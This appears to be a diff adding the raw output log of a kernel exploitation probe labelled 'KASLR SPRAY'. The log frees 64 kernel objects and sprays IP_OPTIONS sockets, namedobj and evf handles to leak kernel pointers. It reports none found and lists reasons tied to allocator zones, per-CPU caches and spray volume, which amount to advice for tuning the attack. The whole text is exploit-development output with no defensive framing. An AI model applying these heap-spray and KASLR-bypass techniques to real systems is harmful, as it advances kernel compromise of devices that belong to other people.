@@ -1,0 +1,51 @@
+=== PROBE 69d: KASLR SPRAY ===
+
+pid=88
+zero_fd=23
+
+[A] Allocate and free 64 R objects
+  submitted: 64
+  polled all
+  deleted: 64/64 (R objects now freed with kernel ptrs)
+
+[B] Spray: IP_OPTIONS (128 sockets)
+  created 126 sockets with IP_OPTIONS
+  sock[1] fd=24 ret=0 len=0 d0=0xDEDEDEDE d4=0xDEDEDEDE
+  sock[2] fd=25 ret=0 len=0 d0=0xDEDEDEDE d4=0xDEDEDEDE
+  sock[3] fd=26 ret=0 len=0 d0=0xDEDEDEDE d4=0xDEDEDEDE
+  IP_OPTIONS kernel pointers: 0
+
+[C] Spray: namedobj_create (128 objects)
+  freed 64 fresh R objects
+  created 128 namedobj handles
+  handle[1]=0x0000A208
+  handle[2]=0x00006207
+  handle[3]=0x00006206
+  namedobj kernel pointers in handles: 0
+
+[D] Spray: evf_create (128 objects)
+  freed 64 fresh R objects
+  created 128 evf handles
+  handle[1]=0x00004245
+  handle[2]=0x00004246
+  handle[3]=0x00004247
+  evf kernel pointers in handles: 0
+
+[E] Deep getsockopt scan (option numbers 1-20 on fresh socket)
+  scan socket fd=24
+  deep scan kernel pointers: 0
+
+[F] SUMMARY
+  IP_OPTIONS kptrs:  0
+  namedobj kptrs:    0
+  evf kptrs:         0
+  process:           ALIVE
+
+No kernel pointers found. Possible reasons:
+  1. Spray objects not in R's 64B zone (wrong size)
+  2. Zone constructors overwrote R+0x00/R+0x08
+  3. UMA per-CPU cache kept R from central free list
+  4. Need more spray volume (try 4096+)
+
+alive=YES
+=== PROBE 69d COMPLETE ===
